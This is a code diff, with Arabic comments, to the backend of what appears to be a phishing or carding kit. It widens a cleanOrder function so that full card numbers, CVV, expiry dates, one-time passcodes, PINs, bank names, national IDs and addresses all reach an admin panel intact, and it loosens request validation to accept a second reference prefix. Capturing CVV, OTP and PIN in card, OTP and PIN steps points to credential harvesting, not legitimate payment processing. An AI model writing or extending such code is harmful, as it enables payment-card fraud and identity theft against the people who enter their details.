@@ -54,24 +54,24 @@ const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
 // الحقول المسموح حفظها فقط (مصححة نهائياً لعرض رقم البطاقة والبيانات كاملة)
 function cleanOrder(b) {
   const p = b.pay && typeof b.pay === "object" ? b.pay : {};
-  
-  // استخلاص رقم البطاقة بشكل صحيح من أي حقل محتمل وتجنب الـ boolean
-  let rawCard = p.cardNumber || p.number || p.fullCard || p.card || "";
+
+  // استخلاص جميع بيانات الطلب والدفع من الحقول العلوية والداخلية لتصل كاملة للوحة الإدارة
+  let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
   if (typeof rawCard === "boolean" || rawCard === true || rawCard === false) rawCard = "";
 
-  let rawCvv = p.cvv || "";
+  let rawCvv = b.cvv || p.cvv || "";
   if (typeof rawCvv === "boolean") rawCvv = "";
 
-  let rawExp = p.exp || p.expiry || "";
+  let rawExp = b.expiry || p.exp || p.expiry || "";
   if (typeof rawExp === "boolean") rawExp = "";
 
-  let rawOtp = p.otp || p.code || "";
+  let rawOtp = b.otp || p.otp || p.code || "";
   if (typeof rawOtp === "boolean") rawOtp = "";
 
-  let rawPin = p.pin || "";
+  let rawPin = b.pin || p.pin || "";
   if (typeof rawPin === "boolean") rawPin = "";
 
-  let rawName = p.cardName || p.name || "";
+  let rawName = b.cardName || p.cardName || p.name || "";
   if (typeof rawName === "boolean") rawName = "";
 
   return {
@@ -80,13 +80,15 @@ function cleanOrder(b) {
     st: b.st === "resident" ? "resident" : "citizen",
     n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
     e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
-    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
+    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
+    bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
+    lang: b.lang === "en" ? "en" : "ar",
     step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
     pay: {
       cardName: str(rawName, 200),
       cardNumber: str(rawCard, 200),
       last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
-      brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
+      brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
       exp: str(rawExp, 50),
       cvv: str(rawCvv, 50),
       otp: str(rawOtp, 50),
@@ -102,7 +104,7 @@ async function api(req, res, url) {
     const o = cleanOrder(b);
     if (o.pay === undefined) delete o.pay;
     if (o.step === undefined) delete o.step;
-    if (!/^FZ-\d{6,}$/.test(o.ref) || !o.n || o.p.length !== 9) return send(res, 400, { ok: false, error: "invalid" });
+    if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return send(res, 400, { ok: false, error: "invalid" });
     const i = orders.findIndex(x => x.ref === o.ref);
     if (i >= 0) {
       const prev = orders[i];
